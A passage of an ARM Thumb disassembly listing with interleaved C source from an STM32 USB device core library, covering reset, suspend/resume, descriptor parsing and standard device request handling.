 800b2d4:	7dfa      	ldrb	r2, [r7, #23]
 800b2d6:	68fb      	ldr	r3, [r7, #12]
 800b2d8:	32ae      	adds	r2, #174	; 0xae
 800b2da:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2de:	695b      	ldr	r3, [r3, #20]
 800b2e0:	2b00      	cmp	r3, #0
 800b2e2:	d014      	beq.n	800b30e <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b2e4:	7dfa      	ldrb	r2, [r7, #23]
 800b2e6:	68fb      	ldr	r3, [r7, #12]
 800b2e8:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b2ec:	7dfa      	ldrb	r2, [r7, #23]
 800b2ee:	68fb      	ldr	r3, [r7, #12]
 800b2f0:	32ae      	adds	r2, #174	; 0xae
 800b2f2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2f6:	695b      	ldr	r3, [r3, #20]
 800b2f8:	7afa      	ldrb	r2, [r7, #11]
 800b2fa:	4611      	mov	r1, r2
 800b2fc:	68f8      	ldr	r0, [r7, #12]
 800b2fe:	4798      	blx	r3
 800b300:	4603      	mov	r3, r0
 800b302:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b304:	7dbb      	ldrb	r3, [r7, #22]
 800b306:	2b00      	cmp	r3, #0
 800b308:	d001      	beq.n	800b30e <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b30a:	7dbb      	ldrb	r3, [r7, #22]
 800b30c:	e000      	b.n	800b310 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b30e:	2300      	movs	r3, #0
}
 800b310:	4618      	mov	r0, r3
 800b312:	3718      	adds	r7, #24
 800b314:	46bd      	mov	sp, r7
 800b316:	bd80      	pop	{r7, pc}

0800b318 <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b318:	b580      	push	{r7, lr}
 800b31a:	b084      	sub	sp, #16
 800b31c:	af00      	add	r7, sp, #0
 800b31e:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b320:	2300      	movs	r3, #0
 800b322:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b324:	687b      	ldr	r3, [r7, #4]
 800b326:	2201      	movs	r2, #1
 800b328:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b32c:	687b      	ldr	r3, [r7, #4]
 800b32e:	2200      	movs	r2, #0
 800b330:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b334:	687b      	ldr	r3, [r7, #4]
 800b336:	2200      	movs	r2, #0
 800b338:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b33a:	687b      	ldr	r3, [r7, #4]
 800b33c:	2200      	movs	r2, #0
 800b33e:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b342:	687b      	ldr	r3, [r7, #4]
 800b344:	2200      	movs	r2, #0
 800b346:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b34a:	687b      	ldr	r3, [r7, #4]
 800b34c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b350:	2b00      	cmp	r3, #0
 800b352:	d014      	beq.n	800b37e <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b354:	687b      	ldr	r3, [r7, #4]
 800b356:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b35a:	685b      	ldr	r3, [r3, #4]
 800b35c:	2b00      	cmp	r3, #0
 800b35e:	d00e      	beq.n	800b37e <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b360:	687b      	ldr	r3, [r7, #4]
 800b362:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b366:	685b      	ldr	r3, [r3, #4]
 800b368:	687a      	ldr	r2, [r7, #4]
 800b36a:	6852      	ldr	r2, [r2, #4]
 800b36c:	b2d2      	uxtb	r2, r2
 800b36e:	4611      	mov	r1, r2
 800b370:	6878      	ldr	r0, [r7, #4]
 800b372:	4798      	blx	r3
 800b374:	4603      	mov	r3, r0
 800b376:	2b00      	cmp	r3, #0
 800b378:	d001      	beq.n	800b37e <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b37a:	2303      	movs	r3, #3
 800b37c:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b37e:	2340      	movs	r3, #64	; 0x40
 800b380:	2200      	movs	r2, #0
 800b382:	2100      	movs	r1, #0
 800b384:	6878      	ldr	r0, [r7, #4]
 800b386:	f001 fbc3 	bl	800cb10 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b38a:	687b      	ldr	r3, [r7, #4]
 800b38c:	2201      	movs	r2, #1
 800b38e:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b392:	687b      	ldr	r3, [r7, #4]
 800b394:	2240      	movs	r2, #64	; 0x40
 800b396:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b39a:	2340      	movs	r3, #64	; 0x40
 800b39c:	2200      	movs	r2, #0
 800b39e:	2180      	movs	r1, #128	; 0x80
 800b3a0:	6878      	ldr	r0, [r7, #4]
 800b3a2:	f001 fbb5 	bl	800cb10 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b3a6:	687b      	ldr	r3, [r7, #4]
 800b3a8:	2201      	movs	r2, #1
 800b3aa:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b3ac:	687b      	ldr	r3, [r7, #4]
 800b3ae:	2240      	movs	r2, #64	; 0x40
 800b3b0:	621a      	str	r2, [r3, #32]

  return ret;
 800b3b2:	7bfb      	ldrb	r3, [r7, #15]
}
 800b3b4:	4618      	mov	r0, r3
 800b3b6:	3710      	adds	r7, #16
 800b3b8:	46bd      	mov	sp, r7
 800b3ba:	bd80      	pop	{r7, pc}

0800b3bc <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b3bc:	b480      	push	{r7}
 800b3be:	b083      	sub	sp, #12
 800b3c0:	af00      	add	r7, sp, #0
 800b3c2:	6078      	str	r0, [r7, #4]
 800b3c4:	460b      	mov	r3, r1
 800b3c6:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b3c8:	687b      	ldr	r3, [r7, #4]
 800b3ca:	78fa      	ldrb	r2, [r7, #3]
 800b3cc:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b3ce:	2300      	movs	r3, #0
}
 800b3d0:	4618      	mov	r0, r3
 800b3d2:	370c      	adds	r7, #12
 800b3d4:	46bd      	mov	sp, r7
 800b3d6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b3da:	4770      	bx	lr

0800b3dc <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b3dc:	b480      	push	{r7}
 800b3de:	b083      	sub	sp, #12
 800b3e0:	af00      	add	r7, sp, #0
 800b3e2:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b3e4:	687b      	ldr	r3, [r7, #4]
 800b3e6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3ea:	b2db      	uxtb	r3, r3
 800b3ec:	2b04      	cmp	r3, #4
 800b3ee:	d006      	beq.n	800b3fe <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b3f0:	687b      	ldr	r3, [r7, #4]
 800b3f2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3f6:	b2da      	uxtb	r2, r3
 800b3f8:	687b      	ldr	r3, [r7, #4]
 800b3fa:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b3fe:	687b      	ldr	r3, [r7, #4]
 800b400:	2204      	movs	r2, #4
 800b402:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b406:	2300      	movs	r3, #0
}
 800b408:	4618      	mov	r0, r3
 800b40a:	370c      	adds	r7, #12
 800b40c:	46bd      	mov	sp, r7
 800b40e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b412:	4770      	bx	lr

0800b414 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b414:	b480      	push	{r7}
 800b416:	b083      	sub	sp, #12
 800b418:	af00      	add	r7, sp, #0
 800b41a:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b41c:	687b      	ldr	r3, [r7, #4]
 800b41e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b422:	b2db      	uxtb	r3, r3
 800b424:	2b04      	cmp	r3, #4
 800b426:	d106      	bne.n	800b436 <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b428:	687b      	ldr	r3, [r7, #4]
 800b42a:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b42e:	b2da      	uxtb	r2, r3
 800b430:	687b      	ldr	r3, [r7, #4]
 800b432:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b436:	2300      	movs	r3, #0
}
 800b438:	4618      	mov	r0, r3
 800b43a:	370c      	adds	r7, #12
 800b43c:	46bd      	mov	sp, r7
 800b43e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b442:	4770      	bx	lr

0800b444 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b444:	b580      	push	{r7, lr}
 800b446:	b082      	sub	sp, #8
 800b448:	af00      	add	r7, sp, #0
 800b44a:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b44c:	687b      	ldr	r3, [r7, #4]
 800b44e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b452:	b2db      	uxtb	r3, r3
 800b454:	2b03      	cmp	r3, #3
 800b456:	d110      	bne.n	800b47a <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b458:	687b      	ldr	r3, [r7, #4]
 800b45a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b45e:	2b00      	cmp	r3, #0
 800b460:	d00b      	beq.n	800b47a <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b462:	687b      	ldr	r3, [r7, #4]
 800b464:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b468:	69db      	ldr	r3, [r3, #28]
 800b46a:	2b00      	cmp	r3, #0
 800b46c:	d005      	beq.n	800b47a <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b46e:	687b      	ldr	r3, [r7, #4]
 800b470:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b474:	69db      	ldr	r3, [r3, #28]
 800b476:	6878      	ldr	r0, [r7, #4]
 800b478:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b47a:	2300      	movs	r3, #0
}
 800b47c:	4618      	mov	r0, r3
 800b47e:	3708      	adds	r7, #8
 800b480:	46bd      	mov	sp, r7
 800b482:	bd80      	pop	{r7, pc}

0800b484 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b484:	b480      	push	{r7}
 800b486:	b083      	sub	sp, #12
 800b488:	af00      	add	r7, sp, #0
 800b48a:	6078      	str	r0, [r7, #4]
 800b48c:	460b      	mov	r3, r1
 800b48e:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b490:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b492:	4618      	mov	r0, r3
 800b494:	370c      	adds	r7, #12
 800b496:	46bd      	mov	sp, r7
 800b498:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b49c:	4770      	bx	lr

0800b49e <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b49e:	b480      	push	{r7}
 800b4a0:	b083      	sub	sp, #12
 800b4a2:	af00      	add	r7, sp, #0
 800b4a4:	6078      	str	r0, [r7, #4]
 800b4a6:	460b      	mov	r3, r1
 800b4a8:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b4aa:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b4ac:	4618      	mov	r0, r3
 800b4ae:	370c      	adds	r7, #12
 800b4b0:	46bd      	mov	sp, r7
 800b4b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4b6:	4770      	bx	lr

0800b4b8 <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b4b8:	b580      	push	{r7, lr}
 800b4ba:	b086      	sub	sp, #24
 800b4bc:	af00      	add	r7, sp, #0
 800b4be:	6078      	str	r0, [r7, #4]
 800b4c0:	460b      	mov	r3, r1
 800b4c2:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b4c4:	687b      	ldr	r3, [r7, #4]
 800b4c6:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b4c8:	687b      	ldr	r3, [r7, #4]
 800b4ca:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b4cc:	2300      	movs	r3, #0
 800b4ce:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b4d0:	68fb      	ldr	r3, [r7, #12]
 800b4d2:	885b      	ldrh	r3, [r3, #2]
 800b4d4:	b29a      	uxth	r2, r3
 800b4d6:	68fb      	ldr	r3, [r7, #12]
 800b4d8:	781b      	ldrb	r3, [r3, #0]
 800b4da:	b29b      	uxth	r3, r3
 800b4dc:	429a      	cmp	r2, r3
 800b4de:	d920      	bls.n	800b522 <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b4e0:	68fb      	ldr	r3, [r7, #12]
 800b4e2:	781b      	ldrb	r3, [r3, #0]
 800b4e4:	b29b      	uxth	r3, r3
 800b4e6:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b4e8:	e013      	b.n	800b512 <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b4ea:	f107 030a 	add.w	r3, r7, #10
 800b4ee:	4619      	mov	r1, r3
 800b4f0:	6978      	ldr	r0, [r7, #20]
 800b4f2:	f000 f81b 	bl	800b52c <USBD_GetNextDesc>
 800b4f6:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b4f8:	697b      	ldr	r3, [r7, #20]
 800b4fa:	785b      	ldrb	r3, [r3, #1]
 800b4fc:	2b05      	cmp	r3, #5
 800b4fe:	d108      	bne.n	800b512 <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b500:	697b      	ldr	r3, [r7, #20]
 800b502:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b504:	693b      	ldr	r3, [r7, #16]
 800b506:	789b      	ldrb	r3, [r3, #2]
 800b508:	78fa      	ldrb	r2, [r7, #3]
 800b50a:	429a      	cmp	r2, r3
 800b50c:	d008      	beq.n	800b520 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b50e:	2300      	movs	r3, #0
 800b510:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b512:	68fb      	ldr	r3, [r7, #12]
 800b514:	885b      	ldrh	r3, [r3, #2]
 800b516:	b29a      	uxth	r2, r3
 800b518:	897b      	ldrh	r3, [r7, #10]
 800b51a:	429a      	cmp	r2, r3
 800b51c:	d8e5      	bhi.n	800b4ea <USBD_GetEpDesc+0x32>
 800b51e:	e000      	b.n	800b522 <USBD_GetEpDesc+0x6a>
          break;
 800b520:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b522:	693b      	ldr	r3, [r7, #16]
}
 800b524:	4618      	mov	r0, r3
 800b526:	3718      	adds	r7, #24
 800b528:	46bd      	mov	sp, r7
 800b52a:	bd80      	pop	{r7, pc}

0800b52c <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b52c:	b480      	push	{r7}
 800b52e:	b085      	sub	sp, #20
 800b530:	af00      	add	r7, sp, #0
 800b532:	6078      	str	r0, [r7, #4]
 800b534:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b536:	687b      	ldr	r3, [r7, #4]
 800b538:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b53a:	683b      	ldr	r3, [r7, #0]
 800b53c:	881a      	ldrh	r2, [r3, #0]
 800b53e:	68fb      	ldr	r3, [r7, #12]
 800b540:	781b      	ldrb	r3, [r3, #0]
 800b542:	b29b      	uxth	r3, r3
 800b544:	4413      	add	r3, r2
 800b546:	b29a      	uxth	r2, r3
 800b548:	683b      	ldr	r3, [r7, #0]
 800b54a:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b54c:	68fb      	ldr	r3, [r7, #12]
 800b54e:	781b      	ldrb	r3, [r3, #0]
 800b550:	461a      	mov	r2, r3
 800b552:	687b      	ldr	r3, [r7, #4]
 800b554:	4413      	add	r3, r2
 800b556:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b558:	68fb      	ldr	r3, [r7, #12]
}
 800b55a:	4618      	mov	r0, r3
 800b55c:	3714      	adds	r7, #20
 800b55e:	46bd      	mov	sp, r7
 800b560:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b564:	4770      	bx	lr

0800b566 <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b566:	b480      	push	{r7}
 800b568:	b087      	sub	sp, #28
 800b56a:	af00      	add	r7, sp, #0
 800b56c:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b56e:	687b      	ldr	r3, [r7, #4]
 800b570:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b572:	697b      	ldr	r3, [r7, #20]
 800b574:	781b      	ldrb	r3, [r3, #0]
 800b576:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b578:	697b      	ldr	r3, [r7, #20]
 800b57a:	3301      	adds	r3, #1
 800b57c:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b57e:	697b      	ldr	r3, [r7, #20]
 800b580:	781b      	ldrb	r3, [r3, #0]
 800b582:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b584:	8a3b      	ldrh	r3, [r7, #16]
 800b586:	021b      	lsls	r3, r3, #8
 800b588:	b21a      	sxth	r2, r3
 800b58a:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b58e:	4313      	orrs	r3, r2
 800b590:	b21b      	sxth	r3, r3
 800b592:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b594:	89fb      	ldrh	r3, [r7, #14]
}
 800b596:	4618      	mov	r0, r3
 800b598:	371c      	adds	r7, #28
 800b59a:	46bd      	mov	sp, r7
 800b59c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5a0:	4770      	bx	lr
	...

0800b5a4 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b5a4:	b580      	push	{r7, lr}
 800b5a6:	b084      	sub	sp, #16
 800b5a8:	af00      	add	r7, sp, #0
 800b5aa:	6078      	str	r0, [r7, #4]
 800b5ac:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b5ae:	2300      	movs	r3, #0
 800b5b0:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b5b2:	683b      	ldr	r3, [r7, #0]
 800b5b4:	781b      	ldrb	r3, [r3, #0]
 800b5b6:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b5ba:	2b40      	cmp	r3, #64	; 0x40
 800b5bc:	d005      	beq.n	800b5ca <USBD_StdDevReq+0x26>
 800b5be:	2b40      	cmp	r3, #64	; 0x40
 800b5c0:	d857      	bhi.n	800b672 <USBD_StdDevReq+0xce>
 800b5c2:	2b00      	cmp	r3, #0
 800b5c4:	d00f      	beq.n	800b5e6 <USBD_StdDevReq+0x42>
 800b5c6:	2b20      	cmp	r3, #32
 800b5c8:	d153      	bne.n	800b672 <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b5ca:	687b      	ldr	r3, [r7, #4]
 800b5cc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b5d0:	687b      	ldr	r3, [r7, #4]
 800b5d2:	32ae      	adds	r2, #174	; 0xae
 800b5d4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b5d8:	689b      	ldr	r3, [r3, #8]
 800b5da:	6839      	ldr	r1, [r7, #0]
 800b5dc:	6878      	ldr	r0, [r7, #4]
 800b5de:	4798      	blx	r3
 800b5e0:	4603      	mov	r3, r0
 800b5e2:	73fb      	strb	r3, [r7, #15]
      break;
 800b5e4:	e04a      	b.n	800b67c <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b5e6:	683b      	ldr	r3, [r7, #0]
 800b5e8:	785b      	ldrb	r3, [r3, #1]
 800b5ea:	2b09      	cmp	r3, #9
 800b5ec:	d83b      	bhi.n	800b666 <USBD_StdDevReq+0xc2>
 800b5ee:	a201      	add	r2, pc, #4	; (adr r2, 800b5f4 <USBD_StdDevReq+0x50>)
 800b5f0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b5f4:	0800b649 	.word	0x0800b649
 800b5f8:	0800b65d 	.word	0x0800b65d
 800b5fc:	0800b667 	.word	0x0800b667
 800b600:	0800b653 	.word	0x0800b653
 800b604:	0800b667 	.word	0x0800b667
 800b608:	0800b627 	.word	0x0800b627
 800b60c:	0800b61d 	.word	0x0800b61d
 800b610:	0800b667 	.word	0x0800b667
 800b614:	0800b63f 	.word	0x0800b63f
 800b618:	0800b631 	.word	0x0800b631
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b61c:	6839      	ldr	r1, [r7, #0]
 800b61e:	6878      	ldr	r0, [r7, #4]
 800b620:	f000 fa3c 	bl	800ba9c <USBD_GetDescriptor>
          break;
 800b624:	e024      	b.n	800b670 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b626:	6839      	ldr	r1, [r7, #0]
 800b628:	6878      	ldr	r0, [r7, #4]
 800b62a:	f000 fbcb 	bl	800bdc4 <USBD_SetAddress>
          break;
 800b62e:	e01f      	b.n	800b670 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b630:	6839      	ldr	r1, [r7, #0]
 800b632:	6878      	ldr	r0, [r7, #4]
 800b634:	f000 fc0a 	bl	800be4c <USBD_SetConfig>
 800b638:	4603      	mov	r3, r0
 800b63a:	73fb      	strb	r3, [r7, #15]
          break;
 800b63c:	e018      	b.n	800b670 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b63e:	6839      	ldr	r1, [r7, #0]
 800b640:	6878      	ldr	r0, [r7, #4]
 800b642:	f000 fcad 	bl	800bfa0 <USBD_GetConfig>
          break;
 800b646:	e013      	b.n	800b670 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b648:	6839      	ldr	r1, [r7, #0]
 800b64a:	6878      	ldr	r0, [r7, #4]
 800b64c:	f000 fcde 	bl	800c00c <USBD_GetStatus>
          break;
 800b650:	e00e      	b.n	800b670 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b652:	6839      	ldr	r1, [r7, #0]
 800b654:	6878      	ldr	r0, [r7, #4]
 800b656:	f000 fd0d 	bl	800c074 <USBD_SetFeature>
          break;
 800b65a:	e009      	b.n	800b670 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b65c:	6839      	ldr	r1, [r7, #0]
 800b65e:	6878      	ldr	r0, [r7, #4]
 800b660:	f000 fd31 	bl	800c0c6 <USBD_ClrFeature>
          break;
 800b664:	e004      	b.n	800b670 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b666:	6839      	ldr	r1, [r7, #0]
 800b668:	6878      	ldr	r0, [r7, #4]
 800b66a:	f000 fd88 	bl	800c17e <USBD_CtlError>
          break;
 800b66e:	bf00      	nop
      }
      break;
 800b670:	e004      	b.n	800b67c <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b672:	6839      	ldr	r1, [r7, #0]
 800b674:	6878      	ldr	r0, [r7, #4]
 800b676:	f000 fd82 	bl	800c17e <USBD_CtlError>
      break;
 800b67a:	bf00      	nop
  }

  return ret;
 800b67c:	7bfb      	ldrb	r3, [r7, #15]
}
 800b67e:	4618      	mov	r0, r3
 800b680:	3710      	adds	r7, #16
 800b682:	46bd      	mov	sp, r7
 800b684:	bd80      	pop	{r7, pc}
 800b686:	bf00      	nop

0800b688 <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b688:	b580      	push	{r7, lr}
 800b68a:	b084      	sub	sp, #16
 800b68c:	af00      	add	r7, sp, #0
 800b68e:	6078      	str	r0, [r7, #4]
 800b690:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b692:	2300      	movs	r3, #0
 800b694:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b696:	683b      	ldr	r3, [r7, #0]
 800b698:	781b      	ldrb	r3, [r3, #0]
 800b69a:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b69e:	2b40      	cmp	r3, #64	; 0x40
 800b6a0:	d005      	beq.n	800b6ae <USBD_StdItfReq+0x26>
 800b6a2:	2b40      	cmp	r3, #64	; 0x40
 800b6a4:	d852      	bhi.n	800b74c <USBD_StdItfReq+0xc4>
 800b6a6:	2b00      	cmp	r3, #0
 800b6a8:	d001      	beq.n	800b6ae <USBD_StdItfReq+0x26>
 800b6aa:	2b20      	cmp	r3, #32
